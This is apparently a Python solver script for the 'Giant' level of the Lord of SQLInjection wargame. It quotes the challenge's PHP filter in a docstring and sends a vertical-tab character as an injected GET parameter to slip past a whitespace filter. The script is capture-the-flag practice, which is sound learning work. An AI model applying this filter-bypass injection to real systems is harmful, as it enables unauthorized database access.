#!/usr/bin/env python3
import los
import los_cookies as lc


def main():
    """
    Giant

    if(strlen($_GET[shit])>1) exit("No Hack ~_~");
    if(preg_match('/ |\n|\r|\t/i', $_GET[shit])) exit("HeHe");
    $query = "select 1234 from{$_GET[shit]}prob_giant where 1";
    echo "<hr>query : <strong>{$query}</strong><hr><br>";
    $result = @mysqli_fetch_array(mysqli_query($db,$query));
    if($result[1234]) solve("giant");
    """

    url = "https://los.rubiya.kr/chall/giant_18a08c3be1d1753de0cb157703f75a5e.php"
    cook = lc.check_cookies(url)
    method = 'get'
    inj_param = 'shit'
    payload = "\v"

    p = los.SqlInjection(url, cook, method, inj_param, payload)
    response = p.my_request()

    if 'Clear!' in response:
        print('\nGiant Clear!')


if __name__ == '__main__':
    main()
